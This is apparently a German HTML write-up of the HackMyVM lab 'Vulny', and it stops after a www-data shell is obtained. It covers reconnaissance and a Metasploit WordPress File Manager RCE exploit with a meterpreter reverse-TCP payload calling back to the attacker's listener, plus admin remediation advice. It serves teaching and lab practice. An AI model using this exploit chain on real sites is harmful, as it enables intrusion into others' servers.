@@ -1,0 +1,538 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Vulny - HackMyVM - Bericht</title> <!-- Titel angepasst -->
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+    <!-- Hinweis: Sicherstellen, dass style.css die korrekte Header-Farbe (#03b5f5) und die roten Farben für .difficulty-Hard enthält -->
+</head>
+ <body>
+ 
+
+    <!-- Hinweis: Die CSS-Datei muss die Hintergrundfarbe #03b5f5 für .header-bg definieren -->
+    <div class="header-bg">
+        <h1>Vulny - HackMyVM - Level: Easy - Bericht</h1> <!-- Name und Level angepasst -->
+        <div class="level-container">
+            <!-- Klassen für rote Farbe (Hard), Text ist aber "Easy" -->
+            <h2 class="difficulty-Hard">Easy</h2>
+            <div class="circle difficulty-bg-Hard">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <!-- Die CSS-Datei muss die passende Hintergrundfarbe für .inner definieren, die mit #03b5f5 korrespondiert -->
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <!-- Tools basierend auf dem Berichtstext -->
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">msfconsole</div>
+                <div class="tool-item">meterpreter</div>
+                <div class="tool-item">python3</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">su</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">flock</div>
+                <div class="tool-item">sh</div>
+                 <div class="tool-item">id</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <!-- Inhaltsverzeichnis -->
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#initial-access">Initial Access</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                <li><a href="#poc">Proof of Concept (Root)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <p class="analysis"><strong>Analyse:</strong> Der `arp-scan -l` Befehl wird verwendet, um aktive Geräte im lokalen Netzwerksegment zu identifizieren, indem ARP-Anfragen gesendet werden. Dies ist oft der erste Schritt, um potenzielle Ziele in der unmittelbaren Netzwerkumgebung zu finden.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Scan war erfolgreich und hat ein Gerät mit der IP-Adresse 192.168.2.125 und der MAC-Adresse 08:00:27:8f:52:d8 gefunden. Die MAC-Adresse gehört zu "PCS Systemtechnik GmbH", was häufig auf eine VirtualBox-VM hinweist.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die identifizierte IP 192.168.2.125 sollte als nächstes mit einem detaillierten Portscan (z.B. Nmap) untersucht werden, um offene Ports und Dienste zu ermitteln.<br><strong>Empfehlung (Admin):</strong> Regelmäßiges Monitoring des Netzwerks auf unbekannte oder nicht autorisierte Geräte. Implementierung von Network Access Control (NAC) kann helfen, nur zugelassene Geräte ins Netzwerk zu lassen.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+192.168.2.125	08:00:27:8f:52:d8	PCS Systemtechnik GmbH
+                    </pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Ein umfassender Nmap-Scan wird auf die Ziel-IP 192.168.2.125 durchgeführt.
+                - `-sS`: TCP SYN Scan (Stealth Scan).
+                - `-sC`: Führt Standard-Nmap-Skripte aus.
+                - `-T5`: Sehr aggressives Timing für schnelleren Scan (potenziell ungenauer oder lauter).
+                - `-sV`: Versucht, die Versionen der laufenden Dienste zu ermitteln.
+                - `-A`: Aktiviert OS-Erkennung, Versionserkennung, Skript-Scanning und Traceroute.
+                - `-p-`: Scannt alle 65535 TCP-Ports.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Scan identifiziert zwei offene Ports:
+                - **Port 80 (HTTP):** Läuft ein Apache httpd 2.4.41 auf Ubuntu. Die Standardseite ("It works") ist sichtbar. Dies ist ein primärer Angriffsvektor.
+                - **Port 33060 (mysqlx?):** Nmap erkennt einen Dienst, kann ihn aber nicht eindeutig identifizieren (`mysqlx?`). Die zurückgegebenen Fingerprint-Strings (`Invalid message" ... HY000`) deuten stark auf einen MySQL-Dienst hin, der das X Protocol verwendet (Standardport 33060). MySQL ist oft ein Ziel für Angreifer, wenn er extern erreichbar ist oder schwache Passwörter verwendet.
+            Die Betriebssystemerkennung deutet ebenfalls auf Linux (Kernel 4.x/5.x) hin, was mit Ubuntu übereinstimmt. Die MAC-Adresse bestätigt die VirtualBox-VM.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuche den Webserver auf Port 80 gründlich (Verzeichnis-Bruteforcing, Schwachstellen-Scans, manuelle Untersuchung). Versuche, dich mit dem MySQL-Dienst auf Port 33060 zu verbinden (z.B. mit `mysql` Client, falls das X Protocol unterstützt wird, oder spezialisierten Tools) und teste auf Standard- oder schwache Zugangsdaten. Beachte, dass der Standard-MySQL-Port 3306 ist, 33060 ist ungewöhnlich und spezifisch für das X Protocol.<br><strong>Empfehlung (Admin):</strong> Aktualisiere Apache und das zugrundeliegende Ubuntu-System. Schließe Port 33060 in der Firewall, wenn kein externer Zugriff auf MySQL benötigt wird. Falls Zugriff benötigt wird, stelle sicher, dass starke Passwörter verwendet werden und der Zugriff auf bestimmte IPs beschränkt ist.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -T5 -sV -A 192.168.2.125 -p-</span></div>
+                    <pre>
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-08 17:20 CEST
+Nmap scan report for vulny (192.168.2.125)
+Host is up (0.00016s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT      STATE SERVICE VERSION
+80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-title: Apache2 Ubuntu Default Page: It works
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+33060/tcp open  mysqlx?
+| fingerprint-strings:
+|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp:
+|     Invalid message"
+|_    HY000
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port33060-TCP:V=7.92%I=7%D=10/8%Time=63419534%P=x86_64-pc-linux-gnu%r(N
+SF:ULL,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(GenericLines,9,"\x05\0\0\0\x0b\
+SF:x08\x05\x1a\0")%r(GetRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(HTTPp
+SF:tions,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(RTSPRequest,9,"\x05\0\0\0\x0b
+SF:\x08\x05\x1a\0")%r(RPCCheck,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(DNSVers
+SF:ionBindReqTCP,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(DNSStatusRequestTCP,2
+SF:B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fI
+SF:nvalid\x20message\"\x05HY000")%r(Help,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")
+SF:%r(SSLSessionReq,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01
+SF:\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000")%r(TerminalServerCookie
+SF:,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(TLSSessionReq,2B,"\x05\0\0\0\x0b\x
+SF:08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"
+SF:\x05HY000")%r(Kerberos,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(SMBProgNeg,9
+SF:,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(X11Probe,2B,"\x05\0\0\0\x0b\x08\x05\
+SF:x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY0
+SF:00")%r(FourhFourRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LPDString,
+SF:9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LDAPSearchReq,2B,"\x05\0\0\0\x0b\x0
+SF:8\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\
+SF:x05HY000")%r(LDAPBindReq,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(SIPptions
+SF:,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LANDesk-RC,9,"\x05\0\0\0\x0b\x08\x
+SF:05\x1a\0")%r(TerminalServer,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(NCP,9,"
+SF:\x05\0\0\0\x0b\x08\x05\x1a\0")%r(NotesRPC,2B,"\x05\0\0\0\x0b\x08\x05\x1
+SF:a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000
+SF:")%r(JavaRMI,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(WMSRequest,9,"\x05\0\0
+SF:\0\x0b\x08\x05\x1a\0")%r(oracle-tns,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r
+SF:(ms-sql-s,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(afp,2B,"\x05\0\0\0\x0b\x0
+SF:8\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\
+SF:x05HY000")%r(giop,9,"\x05\0\0\0\x0b\x08\x05\x1a\0");
+MAC Address: 08:00:27:8F:52:D8 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.6
+Network Distance: 1 hop
+
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.16 ms vulny (192.168.2.125)
+
+Nmap done: 1 IP address (1 host up) scanned in 22.77 seconds
+                    </pre>
+                </div>
+            </div>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+            <p class="analysis"><strong>Analyse:</strong> `gobuster` wird verwendet, um Verzeichnisse und Dateien auf dem Webserver unter `http://192.168.2.125` zu entdecken.
+                - `dir`: Verzeichnissuche-Modus.
+                - `-u "http://192.168.2.125"`: Ziel-URL.
+                - `-w ...medium.txt`: Verwendet eine mittelgroße Wortliste von SecLists.
+                - `-x ...`: Sucht nach einer Vielzahl von Dateierweiterungen.
+                - `-t 100`: Setzt die Anzahl der Threads auf 100 für schnellere Suche.
+                - `-e`: Expanded Mode (zeigt volle URLs an).
+                - `-s "200,204,301,302,307,401"`: Zeigt nur Ergebnisse mit diesen spezifischen HTTP-Statuscodes an (OK, No Content, Redirects, Unauthorized).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Gobuster findet mehrere interessante Pfade:
+                - `/index.html`: Die Apache-Standardseite.
+                - `/javascript`: Ein Verzeichnis (Status 301 - Redirect).
+                - `/secret`: Ein weiteres Verzeichnis (Status 301). Dies ist oft ein Hinweis auf versteckte Inhalte.
+            Bei der weiteren Untersuchung von `/secret` (impliziert durch die nächsten gefundenen Pfade) wurden WordPress-bezogene Inhalte entdeckt:
+                - `/secret/wp-content`, `/secret/wp-includes`, `/secret/wp-admin`: Standard-WordPress-Verzeichnisse.
+                - `/secret/readme.html`: Eine WordPress-Readme-Datei, die oft Versionsinformationen enthält.
+            Das Vorhandensein einer WordPress-Installation im Verzeichnis `/secret` ist ein **kritischer Fund**, da WordPress und seine Plugins häufig Schwachstellen aufweisen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Fokussiere die weitere Untersuchung auf die WordPress-Installation unter `/secret`. Verwende Tools wie `wpscan`, um Themes, Plugins, Versionen und bekannte Schwachstellen zu identifizieren. Überprüfe die `/secret/readme.html` auf die WordPress-Version. Versuche, auf `/secret/wp-admin` zuzugreifen (Login-Seite).<br><strong>Empfehlung (Admin):</strong> Wenn die WordPress-Installation nicht benötigt wird, entferne sie. Wenn sie benötigt wird, stelle sicher, dass sie auf dem neuesten Stand ist (Core, Themes, Plugins) und gut abgesichert ist (starke Passwörter, Sicherheitsplugins, Dateiberechtigungen). Verhindere, dass sensible Verzeichnisse oder Dateien öffentlich zugänglich sind.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[/home/cyber/Downloads]
+└─# <span class="command">gobuster dir -u "http://192.168.2.125"  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e -x .git,php,html,xml,zip,7z,tar,bak,sql,py,pl,txt,jpg,jpeg,png,js,aac,ogg,flac,alac,wav,aiff,dsd,mp3,mp4,mkv -t 100 -e -s "200,204,301,302,307,401"</span></div>
+                     <pre>
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.2.125
+[+] Method:                  GET
+[+] Threads:                 100
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Status codes:            200,204,301,302,307,401
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:              git,php,html,xml,zip,7z,tar,bak,sql,py,pl,txt,jpg,jpeg,png,js,aac,ogg,flac,alac,wav,aiff,dsd,mp3,mp4,mkv
+[+] Expanded:                true
+[+] Timeout:                 10s
+===============================================================
+2022/10/08 17:23:10 Starting gobuster
+===============================================================
+http://192.168.2.125/index.html           (Status: 200) [Size: 10918]
+http://192.168.2.125/javascript           (Status: 301) [Size: 319] [--> http://192.168.2.125/javascript/]
+http://192.168.2.125/secret               (Status: 301) [Size: 315] [--> http://192.168.2.125/secret/]
+http://192.168.2.125/secret/wp-content           (Status: 301) [Size: 326] [--> http://192.168.2.125/secret/wp-content/]
+http://192.168.2.125/secret/wp-includes          (Status: 301) [Size: 327] [--> http://192.168.2.125/secret/wp-includes/]
+http://192.168.2.125/secret/readme.html          (Status: 200) [Size: 7368]
+http://192.168.2.125/secret/wp-admin             (Status: 301) [Size: 324] [--> http://192.168.2.125/secret/wp-admin/]
+===============================================================
+2022/10/08 17:28:05 Finished
+===============================================================
+                     </pre> <!-- Formatierung und zusätzliche Header/Footer von Gobuster hinzugefügt für Kontext -->
+                 </div>
+             </div>
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access</h2>
+            <p class="analysis"><strong>Analyse:</strong> Die Metasploit Framework Console (`msfconsole`) wird gestartet. Dies ist ein leistungsfähiges Tool für Penetrationstests, das eine große Datenbank von Exploits, Payloads und Hilfsmodulen enthält.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Start von Metasploit deutet darauf hin, dass eine bekannte Schwachstelle ausgenutzt werden soll, für die ein Metasploit-Modul existiert. Dies ist oft effizienter als das manuelle Anpassen und Ausführen von Standalone-Exploits.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nutze Metasploit, um nach passenden Exploits für die identifizierte WordPress-Installation oder spezifische Plugins zu suchen.<br><strong>Empfehlung (Admin):</strong> Regelmäßige Schwachstellen-Scans und Patch-Management sind entscheidend, um die Angriffsfläche für Tools wie Metasploit zu minimieren.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[/home/cyber/Downloads]
+└─# <span class="command">msfconsole</span></div>
+                     <!-- Metasploit Start-Banner (gekürzt) -->
+                     <pre>
+ Metasploit                        .;lxO0KXXXK0Oxl:.
+                    .'ld:'.     .';ldkOKXXXK0Oxl:.
+                     .d0KXKOkd:.     .';ldkOkxl:.
+                       .:okKXKOkd:.     .':xl:.
+                          ':okKXKOkd:.     .
+                             .:okKXKOkd:.
+                                .:okKXKOkd:.                   .;xl:.
+                                   .:okKXKOkd:.           .';ldkOkxl:.
+                                      .:okKXKOkd:.    .';ldkOKXXXK0Oxl:.
+                                         .:okKXKOkd:';ldkOKXXXK0Oxl:.
+                                            .:okKXKOkO0KXXXK0Oxl:.
+      =[ metasploit v6.2.20-dev                          ]
++ -- --=[ 2248 exploits - 1183 auxiliary - 408 post        ]
++ -- --=[ 951 payloads - 45 encoders - 11 nops            ]
++ -- --=[ 9 evasion                                       ]
+
+Metasploit tip: View all commands with help
+Metasploit Documentation: https://docs.metasploit.com/
+
+msf6 >
+                     </pre> <!-- Metasploit Prompt hinzugefügt -->
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Innerhalb von Metasploit wird der Befehl `search wp-file-manager` verwendet, um nach Modulen zu suchen, die sich auf das WordPress-Plugin "File Manager" beziehen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Suche findet ein passendes Exploit-Modul: `exploit/multi/http/wp_file_manager_rce`. Dieses Modul zielt auf eine bekannte Schwachstelle (CVE-2020-25213) in älteren Versionen des File Manager Plugins ab, die eine nicht authentifizierte Remote Code Execution (RCE) ermöglicht. Der Rang "normal" deutet auf eine relativ zuverlässige Ausnutzung hin.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Wähle dieses Exploit-Modul mit `use 0` oder `use exploit/multi/http/wp_file_manager_rce` aus, konfiguriere die notwendigen Optionen (Ziel-IP, Ziel-URI, Listener-Host) und führe es aus.<br><strong>Empfehlung (Admin):</strong> Wenn das Plugin "File Manager" verwendet wird, **aktualisiere es dringend** auf die neueste Version oder deaktiviere/deinstalliere es, wenn es nicht benötigt wird.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <!-- Metasploit Prompt mit Gold-Klasse (CSS muss dies definieren) -->
+                    <div class="prompt metasploit-prompt">msf6 > <span class="command">search wp-file-manager</span></div>
+                     <pre>
+
+Matching Modules
+================
+
+   #  Name                                    Disclosure Date  Rank    Check  Description
+   -  ----                                    ---------------  ----    -----  -----------
+   0  exploit/multi/http/wp_file_manager_rce  2020-09-09       normal  Yes    WordPress File Manager Unauthenticated Remote Code Execution
+
+
+Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/http/wp_file_manager_rce
+
+                     </pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Das gefundene Exploit-Modul wird mit `use 0` ausgewählt. Metasploit wählt automatisch einen passenden Payload aus (`php/meterpreter/reverse_tcp`).</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Das Modul ist nun aktiv und bereit zur Konfiguration. Der Meterpreter-Payload ist eine gute Wahl, da er eine funktionsreiche, interaktive Sitzung auf dem Zielsystem ermöglicht.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Zeige die Optionen mit `options` oder `show options` an, um zu sehen, welche Parameter gesetzt werden müssen.<br><strong>Empfehlung (Admin):</strong> Keine direkte Aktion.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt metasploit-prompt">msf6 > <span class="command">use 0</span></div>
+                     <pre>
+[*] Using configured payload php/meterpreter/reverse_tcp
+msf6 exploit(multi/http/wp_file_manager_rce) >
+                     </pre> <!-- Nächster Prompt hinzugefügt -->
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Der Befehl `options` (oder `show options`) zeigt die konfigurierbaren Parameter für das ausgewählte Exploit-Modul und den Payload an.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Ausgabe listet die wichtigen Optionen auf:
+                - **Exploit-Optionen:** `RHOSTS` (Ziel-IP), `RPORT` (Ziel-Port, Standard 80), `TARGETURI` (Basispfad der WordPress-Installation).
+                - **Payload-Optionen:** `LHOST` (IP-Adresse des Angreifers, auf der der Listener lauscht), `LPORT` (Port des Listeners, Standard 4444).
+             Diese müssen korrekt gesetzt werden, damit der Exploit funktioniert.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Setze `RHOSTS` auf 192.168.2.125, `LHOST` auf die IP-Adresse deines Kali/Cyber-Systems und `TARGETURI` auf `/secret` (da die WordPress-Installation dort gefunden wurde).<br><strong>Empfehlung (Admin):</strong> Keine direkte Aktion.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt metasploit-prompt">msf6 exploit(multi/http/wp_file_manager_rce) > <span class="command">options</span></div>
+                     <pre>
+
+Module options (exploit/multi/http/wp_file_manager_rce):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   COMMAND    upload           yes       elFinder commands used to exploit the vulnerability (Accepted: upload, mkfile+put)
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                      yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
+   RPORT      80               yes       The target port (TCP)
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI  /                yes       Base path to WordPress installation
+   VHOST                       no        HTTP server virtual host
+
+
+Payload options (php/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST                   yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   WordPress File Manager 6.0-6.8
+
+                     </pre> <!-- Prompt nach options entfernt, da es nur die Optionen anzeigt -->
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Die notwendigen Optionen für den Exploit werden gesetzt:
+                - `set rhost 192.168.2.125`: Setzt die Ziel-IP.
+                - `set lhost 192.168.2.140`: Setzt die IP des Angreifers (Listener-Host).
+                - `set targeturi /secret`: Setzt den Basispfad der WordPress-Installation.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Konfiguration ist abgeschlossen. Der Exploit ist bereit zur Ausführung.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führe den Exploit mit `run` oder `exploit` aus.<br><strong>Empfehlung (Admin):</strong> Keine direkte Aktion, außer die bereits genannten Präventivmaßnahmen.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <!-- Befehle ohne Ausgabe hier -->
+                     <div class="prompt metasploit-prompt">msf6 exploit(multi/http/wp_file_manager_rce) > <span class="command">set rhost 192.168.2.125</span></div>
+                     <div class="prompt metasploit-prompt">msf6 exploit(multi/http/wp_file_manager_rce) > <span class="command">set lhost 192.168.2.140</span></div>
+                     <div class="prompt metasploit-prompt">msf6 exploit(multi/http/wp_file_manager_rce) > <span class="command">set targeturi /secret</span></div>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Der Exploit wird mit `run` gestartet. Metasploit startet zuerst den Reverse-TCP-Handler (Listener) auf dem Angreifer-System (192.168.2.140:4444). Dann führt es einen automatischen Check durch (`AutoCheck`), um zu prüfen, ob das Ziel wahrscheinlich verwundbar ist.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der automatische Check schlägt fehl (`Cannot reliably check exploitability`). Das Modul kann nicht sicher feststellen, ob das Ziel verwundbar ist. Der Exploit wird abgebrochen. Dies kann passieren, wenn das Plugin nicht vorhanden ist, die Version nicht genau erkannt wird oder der Check nicht zuverlässig ist.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Da Gobuster WordPress unter `/secret` gefunden hat und das Plugin "File Manager" eine häufige Schwachstelle ist, ist es wahrscheinlich, dass der Check unzuverlässig ist. Versuche, den Check zu überspringen und die Ausführung zu erzwingen, indem du `set ForceExploit true` setzt und den Exploit erneut ausführst.<br><strong>Empfehlung (Admin):</strong> Keine direkte Aktion.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt metasploit-prompt">msf6 exploit(multi/http/wp_file_manager_rce) > <span class="command">run</span></div>
+                     <pre>
+[*] Started reverse TCP handler on 192.168.2.140:4444
+[*] Running automatic check ("set AutoCheck false" to disable)
+[-] Exploit aborted due to failure: unknown: Cannot reliably check exploitability. "set ForceExploit true" to override check result.
+[*] Exploit completed, but no session was created.
+                     </pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Die Option `ForceExploit` wird auf `true` gesetzt, um den fehlgeschlagenen automatischen Check zu ignorieren und die Ausführung des Exploits zu erzwingen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Notwendiger Schritt, um den Exploit trotz des unsicheren Checks auszuführen.</p>
+              <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führe den Exploit jetzt erneut mit `run` aus.<br><strong>Empfehlung (Admin):</strong> Keine direkte Aktion.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt metasploit-prompt">msf6 exploit(multi/http/wp_file_manager_rce) > <span class="command">set ForceExploit true</span></div>
+                     <pre>ForceExploit => true</pre> <!-- Beispielhafte Bestätigung hinzugefügt -->
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Der Exploit wird erneut mit `run` gestartet, dieses Mal mit `ForceExploit true`.</p>
+             <p class="evaluation"><strong>Bewertung: !!Initial Access erfolgreich!!</strong>
+                - Der Listener wird gestartet.
+                - Der Check wird übersprungen (`ForceExploit is enabled`).
+                - Der Exploit lädt erfolgreich einen PHP-Payload (`7nVwHV.php`) in das Plugin-Verzeichnis hoch: `/secret/wp-content/plugins/wp-file-manager/lib/files/`.
+                - Der Payload wird ausgeführt und sendet eine Meterpreter-Verbindung zurück zum Angreifer.
+                - Eine Meterpreter-Session (`session 1`) wird geöffnet (Verbindung von 192.168.2.125:52910 zu 192.168.2.140:4444).
+                - Der Exploit löscht die hochgeladene PHP-Datei (`Deleted 7nVwHV.php`), um Spuren zu verwischen.
+            Der Angreifer hat nun eine interaktive Meterpreter-Sitzung auf dem Zielsystem, die wahrscheinlich als Webserver-Benutzer (`www-data`) läuft.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nutze die Meterpreter-Sitzung zur weiteren Enumeration des Systems. Überprüfe die Benutzerrechte (`getuid`), hole eine Shell (`shell`), lade Tools hoch/runter und suche nach Wegen zur Privilegieneskalation.<br><strong>Empfehlung (Admin):**DRINGEND:** Untersuche den Vorfall. Entferne verdächtige Prozesse. Patche die WordPress File Manager Schwachstelle oder deaktiviere das Plugin. Ändere alle relevanten Passwörter. Analysiere Logs auf die Aktivitäten des Angreifers.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt metasploit-prompt">msf6 exploit(multi/http/wp_file_manager_rce) > <span class="command">run</span></div>
+                     <pre>
+[*] Started reverse TCP handler on 192.168.2.140:4444
+[*] Running automatic check ("set AutoCheck false" to disable)
+[!] Cannot reliably check exploitability. ForceExploit is enabled, proceeding with exploitation.
+[*] 192.168.2.125:80 - Payload is at /secret/wp-content/plugins/wp-file-manager/lib/files/7nVwHV.php
+[*] Sending stage (39927 bytes) to 192.168.2.125
+[+] Deleted 7nVwHV.php
+[*] Meterpreter session 1 opened (192.168.2.140:4444 -> 192.168.2.125:52910) at 2022-10-08 17:29:41 +0200
+
+meterpreter >
+                     </pre> <!-- Meterpreter Prompt erscheint -->
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Innerhalb der Meterpreter-Sitzung wird versucht, den Linux-Befehl `id` auszuführen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Meterpreter erkennt `id` nicht als internen Befehl. Meterpreter hat eigene Befehle (wie `getuid`, `sysinfo`, `ps`, etc.), aber um Standard-Linux-Befehle auszuführen, muss eine System-Shell geöffnet werden.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwende den Meterpreter-Befehl `getuid`, um die Benutzer-ID zu prüfen, oder öffne eine System-Shell mit dem Befehl `shell`, um Standard-Linux-Befehle wie `id` auszuführen.<br><strong>Empfehlung (Admin):</strong> Keine direkte Aktion.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt metasploit-prompt">meterpreter > <span class="command">id</span></div>
+                     <pre>
+[-] Unknown command: id.
+                     </pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Der Meterpreter-Befehl `shell` wird verwendet, um eine Standard-System-Shell (vermutlich `/bin/sh` oder `/bin/bash`) auf dem Zielsystem zu öffnen. Innerhalb dieser Shell wird dann der Linux-Befehl `id` ausgeführt.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der `shell`-Befehl war erfolgreich, ein Prozess wurde erstellt und ein Kanal geöffnet. Der `id`-Befehl bestätigt, dass die Sitzung als Benutzer `www-data` (uid=33, gid=33) läuft, wie erwartet.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Shell ist jetzt verfügbar. Stabilisiere sie als nächstes für bessere Interaktivität (z.B. mit Python PTY).<br><strong>Empfehlung (Admin):</strong> Keine direkte Aktion.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt metasploit-prompt">meterpreter > <span class="command">shell</span></div>
+                     <pre>
+Process 2045 created.
+Channel 0 created.
+id
